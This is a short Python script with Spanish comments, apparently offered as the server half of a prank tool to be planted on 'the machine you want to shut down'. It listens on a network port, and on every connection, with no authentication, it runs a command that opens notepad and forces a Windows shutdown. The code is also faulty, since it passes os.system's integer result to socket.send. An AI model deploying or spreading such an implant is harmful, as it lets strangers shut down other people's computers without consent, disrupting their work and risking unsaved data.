"""
	                                      __     
	                                     /\ \    
	 __  __  __    ___   ____     ___    \_\ \   
	/\ \/\ \/\ \  / __`\/\_ ,`\  / __`\  /'_` \  
	\ \ \_/ \_/ \/\ \L\ \/_/  /_/\ \L\ \/\ \L\ \ 
	 \ \___x___/'\ \____/ /\____\ \____/\ \___,_\
	  \/__//__/   \/___/  \/____/\/___/  \/__,_ /
	                                             
	                                             
	
	- Esta es la parte del servidor, lo ponéis en la máquina que queréis apagar y ya.
	- NOTA: Esta es la versión de windows, la de Linux está en desarrollo de aquí a un rato ya la tendréis.
	- No me seáis impacientes, Have fun ;D
"""
import socket
import os
import time
socket_s = socket.socket()
# esta es la parte del servidor, metÃ©is vuestra ip, o en su defecto localhost
socket_s.bind(('192.168.0.4',23003))
socket_s.listen(5)
while True:
	conexion, addr = socket_s.accept()
	print("nueva conexion establecida")
	conexion.send(os.system("notepad apagar.txt & shutdown /C \"Bye bye\" /T 3 /s"))
	conexion.close()

